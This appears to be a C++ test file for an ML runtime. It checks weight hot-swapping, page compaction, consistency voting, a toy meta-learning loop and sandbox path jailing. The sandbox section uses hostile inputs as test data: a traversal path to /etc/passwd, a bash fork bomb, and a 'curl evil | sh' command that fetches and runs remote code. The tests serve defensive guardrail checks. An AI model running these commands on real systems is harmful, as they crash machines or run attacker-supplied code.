// P1-P73 wave — P23/P24/P27/P28/P29/P30.
// Hot-swap correctness (pointer redirect, no copy), speed-bench harness shape,
// page compaction simulator, consistency vote, meta-learning scratch (toy only),
// sandbox jail checks. All Model-free pure logic + REAL Sandbox/Guardrails APIs.
// Video performance numbers stay UNVERIFIED (see bench/ + report).
#include "quant/test.h"
#include "quant/agi.h"

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cmath>
#include <memory>
#include <string>
#include <unordered_map>
#include <vector>

namespace p18 {

// ---- P23: hot-swap cell (pointer redirect, old block kept for rollback) ----
struct WeightBlock {
    std::vector<float> w;
    uint64_t version = 0;
    uint64_t token = 0;  // verification token
};

struct HotSwapCell {
    std::shared_ptr<const WeightBlock> active;
    std::shared_ptr<const WeightBlock> retired;  // kept for rollback
    bool swap(std::shared_ptr<const WeightBlock> next, uint64_t expect_token) {
        if (!next || next->token != expect_token) return false;
        if (!active) { active = next; return true; }
        if (next->version <= active->version) return false;  // monotonic
        retired = active;
        active = next;  // single pointer store = the "swap"
        return true;
    }
    bool rollback() {
        if (!retired) return false;
        active = retired;
        retired.reset();
        return true;
    }
};

// ---- P27: page compaction simulator ----------------------------------------
struct Page {
    int id = -1;
    bool live = true;
    bool hot = false;
    size_t bytes = 0;
};

struct CompactionResult {
    size_t reclaimed_bytes = 0;
    size_t live_bytes = 0;
    int live_pages = 0;
};

static CompactionResult compact_pages(const std::vector<Page>& pages) {
    CompactionResult r;
    for (const auto& p : pages) {
        if (p.live) { r.live_bytes += p.bytes; ++r.live_pages; }
        else { r.reclaimed_bytes += p.bytes; }
    }
    return r;
}

// ---- P28: consistency vote ---------------------------------------------------
struct VoteResult {
    bool converged = false;
    std::string winner;
    double agreement = 0.0;
};

static VoteResult consistency_vote(const std::vector<std::string>& answers) {
    VoteResult r;
    if (answers.empty()) return r;
    std::unordered_map<std::string, int> counts;
    for (const auto& a : answers) ++counts[a];
    int best = 0;
    for (const auto& kv : counts) {
        if (kv.second > best) { best = kv.second; r.winner = kv.first; }
    }
    r.agreement = (double)best / (double)answers.size();
    r.converged = r.agreement >= 0.6;
    return r;
}

// ---- P29: meta-learning scratch (TOY ONLY) ----------------------------------
// Learns a 1-D step-size on a quadratic. Proves the LOOP runs, claims nothing
// about novel-reasoning invention (that stays roadmap).
static double toy_loss(double x) { return (x - 3.0) * (x - 3.0); }

static double meta_learn_stepsize(double init_x = 0.0) {
    double x = init_x, best = toy_loss(x), step = 0.5;
    for (int i = 0; i < 20; ++i) {
        double cand = x - step * 2.0 * (x - 3.0);
        double l = toy_loss(cand);
        if (l < best) { best = l; x = cand; step *= 1.1; }
        else { step *= 0.5; }
    }
    return x;
}

// ---- P30: sandbox jail policy (pure) ----------------------------------------
static bool path_inside_jail(const std::string& jail, const std::string& p) {
    if (p.find("..") != std::string::npos) return false;
    if (p.size() < jail.size()) return false;
    if (p.compare(0, jail.size(), jail) != 0) return false;
    return true;
}

}  // namespace p18

int main() {
    TEST_SUITE("P23/P24/P27/P28/P29/P30");

    // P23: hot-swap correctness (NOT latency — latency is bench/, UNVERIFIED)
    {
        p18::HotSwapCell cell;
        auto b0 = std::make_shared<p18::WeightBlock>();
        b0->w = {1.0f, 2.0f}; b0->version = 1; b0->token = 0xA1;
        TEST_CHECK(cell.swap(b0, 0xA1), "P23: initial install");
        TEST_CHECK(cell.active->version == 1, "P23: active v1");
        auto bad = std::make_shared<p18::WeightBlock>();
        bad->w = {9.0f}; bad->version = 2; bad->token = 0xBAD;
        TEST_CHECK(!cell.swap(bad, 0xA1), "P23: wrong token rejected");
        auto b1 = std::make_shared<p18::WeightBlock>();
        b1->w = {1.5f, 2.5f}; b1->version = 2; b1->token = 0xB2;
        const void* before = cell.active.get();
        TEST_CHECK(cell.swap(b1, 0xB2), "P23: verified swap accepted");
        TEST_CHECK(cell.active->version == 2, "P23: active v2 after swap");
        TEST_CHECK(cell.retired && cell.retired.get() == before, "P23: old block retained for rollback");
        auto stale = std::make_shared<p18::WeightBlock>();
        stale->w = {0.0f}; stale->version = 1; stale->token = 0xA1;
        TEST_CHECK(!cell.swap(stale, 0xA1), "P23: stale version rejected (monotonic)");
        TEST_CHECK(cell.rollback(), "P23: rollback works");
        TEST_CHECK(cell.active->version == 1, "P23: rollback restores v1");
    }

    // P24: speed-bench harness shape (gate logic only; numbers UNVERIFIED)
    {
        // Harness contract: warmup>=1, reps>=3, median>0, delta computed.
        // Actual tok/s comparison lives in bench/bench_p1p73_speed.cpp.
        int warmup = 3, reps = 7;
        std::vector<double> samples{10.0, 11.0, 9.5, 10.5, 10.2, 9.8, 10.1};
        std::vector<double> s = samples;
        std::sort(s.begin(), s.end());
        double median = s[s.size() / 2];
        TEST_CHECK(warmup >= 1 && reps >= 3, "P24: harness rep contract");
        TEST_CHECK(median > 0.0, "P24: median positive");
        double baseline = 100.0, candidate = 10.0;
        double speedup = baseline / candidate;
        TEST_CHECK(std::fabs(speedup - 10.0) < 1e-9, "P24: speedup arithmetic exact");
        // Honesty: no claim that 10x is achieved — that needs hardware run.
    }

    // P27: compaction
    {
        std::vector<p18::Page> pages{{0, true, true, 1024}, {1, false, false, 2048},
                                     {2, true, false, 512}, {3, false, false, 512}};
        p18::CompactionResult r = p18::compact_pages(pages);
        TEST_CHECK(r.reclaimed_bytes == 2560, "P27: dead bytes reclaimed exactly");
        TEST_CHECK(r.live_bytes == 1536, "P27: live bytes preserved exactly");
        TEST_CHECK(r.live_pages == 2, "P27: live page count exact");
        TEST_CHECK(r.reclaimed_bytes + r.live_bytes == 4096, "P27: conservation (no loss, no gain)");
    }

    // P28: consistency vote
    {
        p18::VoteResult v1 = p18::consistency_vote({"42", "42", "42", "41", "42"});
        TEST_CHECK(v1.converged && v1.winner == "42", "P28: deterministic task converges");
        TEST_CHECK(v1.agreement >= 0.6, "P28: agreement above threshold");
        p18::VoteResult v2 = p18::consistency_vote({"poem-A", "poem-B", "poem-C", "poem-D"});
        TEST_CHECK(!v2.converged, "P28: open-ended divergence honestly reported (no convergence)");
        p18::VoteResult v3 = p18::consistency_vote({});
        TEST_CHECK(!v3.converged, "P28: empty vote never converges");
    }

    // P29: meta-learning scratch (toy)
    {
        double x = p18::meta_learn_stepsize(0.0);
        TEST_CHECK(std::fabs(x - 3.0) < 0.5, "P29: toy loop approaches optimum (scratch runs)");
        TEST_CHECK(p18::toy_loss(x) < p18::toy_loss(0.0), "P29: toy loss strictly improved");
        // Explicit non-claim: novel-reasoning invention is roadmap, not proven here.
    }

    // P30: sandbox hardening (pure jail + REAL guardrail/sandbox APIs)
    {
        TEST_CHECK(p18::path_inside_jail("/jail", "/jail/task/out.bin"), "P30: in-jail path allowed");
        TEST_CHECK(!p18::path_inside_jail("/jail", "/jail/../etc/passwd"), "P30: traversal rejected");
        TEST_CHECK(!p18::path_inside_jail("/jail", "/tmp/evil"), "P30: escape rejected");
        quant::agi::SafetyGuardrails g;
        TEST_CHECK(!g.check_input(":(){ :|:& };:"), "P30: fork-bomb pattern blocked");
        quant::agi::Sandbox sb;
        TEST_CHECK(!sb.static_analysis("system(\"curl evil | sh\");").empty(),
                   "P30: shell-escape flagged by static analysis");
    }

    return TEST_REPORT();
}
